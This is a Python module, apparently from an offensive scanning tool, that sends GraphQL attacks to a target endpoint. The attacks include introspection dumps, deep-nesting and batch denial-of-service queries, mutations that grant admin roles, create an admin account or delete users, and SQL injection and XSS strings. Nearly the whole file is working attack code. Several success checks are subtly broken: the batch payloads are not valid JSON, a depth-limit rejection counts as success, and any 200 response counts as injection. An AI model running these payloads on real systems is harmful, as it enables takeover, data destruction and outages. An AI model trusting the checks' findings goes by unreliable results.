"""GraphQL Testing Module — deep GraphQL API attacks.

A real attacker doesn't just test REST APIs.
They test GraphQL too. And GraphQL has its own attack surface.

This module:
1. Introspection query abuse
2. Query depth attacks (DoS)
3. Batch query attacks
4. Field suggestion attacks
5. Alias-based attacks
6. Fragment spreading attacks
7. Mutation-based attacks
"""

from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any

from titan.core.models import AttackType, Finding, Severity


@dataclass
class GraphQLPayload:
    """A GraphQL test payload."""
    name: str
    category: str
    query: str
    variables: dict[str, Any]
    expected_effect: str
    severity: Severity
    confidence: float


class GraphQLTester:
    """Deep GraphQL API testing."""

    # ── Introspection Abuse Payloads ────────────────────────────────────

    INTROSPECTION_PAYLOADS = [
        GraphQLPayload(
            name="full_introspection",
            category="introspection",
            query="{__schema{queryType{name}mutationType{name}subscriptionType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}",
            variables={},
            expected_effect="schema_leak",
            severity=Severity.HIGH,
            confidence=0.90,
        ),
        GraphQLPayload(
            name="type_introspection",
            category="introspection",
            query="{__type(name:\"User\"){name fields{name type{name kind}}}}",
            variables={},
            expected_effect="type_leak",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        GraphQLPayload(
            name="mutation_introspection",
            category="introspection",
            query="{__schema{mutationType{name fields{name args{name type{name kind}}}}}}",
            variables={},
            expected_effect="mutation_leak",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        GraphQLPayload(
            name="directive_introspection",
            category="introspection",
            query="{__schema{directives{name locations args{name type{name kind}}}}}",
            variables={},
            expected_effect="directive_leak",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
    ]

    # ── Query Depth Attack Payloads ─────────────────────────────────────

    DEPTH_ATTACK_PAYLOADS = [
        GraphQLPayload(
            name="depth_10",
            category="depth_attack",
            query="{user{friends{friends{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}}}",
            variables={},
            expected_effect="depth_bypass",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        GraphQLPayload(
            name="depth_20",
            category="depth_attack",
            query="{user{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}}}}}}}}}}}",
            variables={},
            expected_effect="depth_bypass",
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
        GraphQLPayload(
            name="circular_query",
            category="depth_attack",
            query="{user{__typename ...on User{friends{__typename ...on User{name}}}}}",
            variables={},
            expected_effect="circular_bypass",
            severity=Severity.HIGH,
            confidence=0.65,
        ),
    ]

    # ── Batch Query Attack Payloads ─────────────────────────────────────

    BATCH_ATTACK_PAYLOADS = [
        GraphQLPayload(
            name="batch_10",
            category="batch_attack",
            query="[{query:\"{user{name}}\"},{query:\"{user{email}}\"},{query:\"{user{phone}}\"},{query:\"{users{name email}}\"},{query:\"{admin{password}}\"},{query:\"{user{name}}\"},{query:\"{user{email}}\"},{query:\"{user{phone}}\"},{query:\"{users{name email}}\"},{query:\"{admin{password}}\"}]",
            variables={},
            expected_effect="batch_bypass",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
        GraphQLPayload(
            name="batch_100",
            category="batch_attack",
            query="[" + ",".join(["{query:\"{user{name}}\"}"] * 100) + "]",
            variables={},
            expected_effect="batch_dos",
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
    ]

    # ── Mutation Attack Payloads ────────────────────────────────────────

    MUTATION_ATTACK_PAYLOADS = [
        GraphQLPayload(
            name="role_escalation",
            category="mutation_attack",
            query='mutation{updateUser(id:1,role:"admin"){id role}}',
            variables={},
            expected_effect="privilege_escalation",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        GraphQLPayload(
            name="password_reset",
            category="mutation_attack",
            query='mutation{resetPassword(email:"admin@evil.com"){token}}',
            variables={},
            expected_effect="password_reset_abuse",
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
        GraphQLPayload(
            name="user_creation",
            category="mutation_attack",
            query='mutation{createUser(email:"hacker@evil.com",password:"hacked123",role:"admin"){id}}',
            variables={},
            expected_effect="unauthorized_creation",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        GraphQLPayload(
            name="data_deletion",
            category="mutation_attack",
            query="mutation{deleteUser(id:1){success}}",
            variables={},
            expected_effect="unauthorized_deletion",
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
    ]

    # ── Injection Payloads ──────────────────────────────────────────────

    INJECTION_PAYLOADS = [
        GraphQLPayload(
            name="sqli_in_query",
            category="injection",
            query='{user(name:"admin\' OR 1=1--"){id name}}',
            variables={},
            expected_effect="sqli",
            severity=Severity.CRITICAL,
            confidence=0.75,
        ),
        GraphQLPayload(
            name="sqli_in_mutation",
            category="injection",
            query='mutation{updateUser(id:"1 OR 1=1",name:"hacked"){id}}',
            variables={},
            expected_effect="sqli",
            severity=Severity.CRITICAL,
            confidence=0.75,
        ),
        GraphQLPayload(
            name="xss_in_field",
            category="injection",
            query='{user(name:"<script>alert(1)</script>"){id name}}',
            variables={},
            expected_effect="xss",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
    ]

    def __init__(self, context: Any = None):
        self.context = context
        self._findings: list[Finding] = []

    async def test_introspection(
        self,
        target_url: str,
        graphql_endpoint: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test introspection queries."""
        findings = []

        for payload in self.INTROSPECTION_PAYLOADS:
            try:
                response = await self._send_query(
                    graphql_endpoint, payload.query, payload.variables, auth_headers
                )

                if response and self._check_introspection(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=graphql_endpoint,
                        method="POST",
                        param="introspection",
                        location="body",
                        payload=payload.query[:500],
                        attack_type=AttackType.INFO_LEAK,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        body=response.get("body", "")[:2000],
                        diffs=[f"graphql:{payload.name}"],
                        notes=f"GraphQL introspection: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_depth_attack(
        self,
        target_url: str,
        graphql_endpoint: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test query depth attacks."""
        findings = []

        for payload in self.DEPTH_ATTACK_PAYLOADS:
            try:
                response = await self._send_query(
                    graphql_endpoint, payload.query, payload.variables, auth_headers
                )

                if response and self._check_depth_attack(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=graphql_endpoint,
                        method="POST",
                        param="query_depth",
                        location="body",
                        payload=payload.query[:500],
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        body=response.get("body", "")[:2000],
                        diffs=[f"graphql:{payload.name}"],
                        notes=f"GraphQL depth attack: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_batch_attack(
        self,
        target_url: str,
        graphql_endpoint: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test batch query attacks."""
        findings = []

        for payload in self.BATCH_ATTACK_PAYLOADS:
            try:
                response = await self._send_batch(
                    graphql_endpoint, payload.query, auth_headers
                )

                if response and self._check_batch_attack(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=graphql_endpoint,
                        method="POST",
                        param="batch_query",
                        location="body",
                        payload=payload.query[:500],
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        body=response.get("body", "")[:2000],
                        diffs=[f"graphql:{payload.name}"],
                        notes=f"GraphQL batch attack: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_mutation_attack(
        self,
        target_url: str,
        graphql_endpoint: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test mutation-based attacks."""
        findings = []

        for payload in self.MUTATION_ATTACK_PAYLOADS:
            try:
                response = await self._send_query(
                    graphql_endpoint, payload.query, payload.variables, auth_headers
                )

                if response and self._check_mutation_attack(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=graphql_endpoint,
                        method="POST",
                        param="mutation",
                        location="body",
                        payload=payload.query[:500],
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        body=response.get("body", "")[:2000],
                        diffs=[f"graphql:{payload.name}"],
                        notes=f"GraphQL mutation attack: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_injection(
        self,
        target_url: str,
        graphql_endpoint: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test injection in GraphQL."""
        findings = []

        for payload in self.INJECTION_PAYLOADS:
            try:
                response = await self._send_query(
                    graphql_endpoint, payload.query, payload.variables, auth_headers
                )

                if response and self._check_injection(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=graphql_endpoint,
                        method="POST",
                        param="graphql_injection",
                        location="body",
                        payload=payload.query[:500],
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        body=response.get("body", "")[:2000],
                        diffs=[f"graphql:{payload.name}"],
                        notes=f"GraphQL injection: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    # ── Helpers ────────────────────────────────────────────────────────

    async def _send_query(
        self,
        endpoint: str,
        query: str,
        variables: dict[str, Any],
        headers: dict[str, str] | None = None,
    ) -> dict[str, Any] | None:
        """Send GraphQL query."""
        try:
            import aiohttp
            payload = {"query": query, "variables": variables}
            async with aiohttp.ClientSession() as session:
                h = headers or {}
                h.setdefault("Content-Type", "application/json")
                async with session.post(endpoint, json=payload, headers=h, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
        except Exception:
            return None

    async def _send_batch(
        self,
        endpoint: str,
        batch: str,
        headers: dict[str, str] | None = None,
    ) -> dict[str, Any] | None:
        """Send batch GraphQL query."""
        try:
            import aiohttp
            payload = json.loads(batch)
            async with aiohttp.ClientSession() as session:
                h = headers or {}
                h.setdefault("Content-Type", "application/json")
                async with session.post(endpoint, json=payload, headers=h, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
        except Exception:
            return None

    def _check_introspection(self, response: dict[str, Any], payload: GraphQLPayload) -> bool:
        """Check if introspection was successful."""
        body = response.get("body", "")
        if response.get("status") == 200:
            if any(kw in body.lower() for kw in ["__schema", "__type", "querytype", "mutationtype"]):
                return True
        return False

    def _check_depth_attack(self, response: dict[str, Any], payload: GraphQLPayload) -> bool:
        """Check if depth attack worked."""
        body = response.get("body", "")
        if response.get("status") == 200:
            if "data" in body and "null" not in body[:100]:
                return True
        elif response.get("status") == 400:
            if "depth" in body.lower() or "limit" in body.lower():
                return True
        return False

    def _check_batch_attack(self, response: dict[str, Any], payload: GraphQLPayload) -> bool:
        """Check if batch attack worked."""
        body = response.get("body", "")
        if response.get("status") == 200:
            if isinstance(json.loads(body), list):
                return True
        return False

    def _check_mutation_attack(self, response: dict[str, Any], payload: GraphQLPayload) -> bool:
        """Check if mutation attack worked."""
        body = response.get("body", "")
        if response.get("status") == 200:
            if "data" in body and "errors" not in body:
                return True
        return False

    def _check_injection(self, response: dict[str, Any], payload: GraphQLPayload) -> bool:
        """Check if injection worked."""
        body = response.get("body", "")
        if any(kw in body.lower() for kw in ["error", "syntax", "exception", "stack"]):
            return True
        if response.get("status") == 200 and "data" in body:
            return True
        return False

    def get_findings(self) -> list[Finding]:
        return self._findings
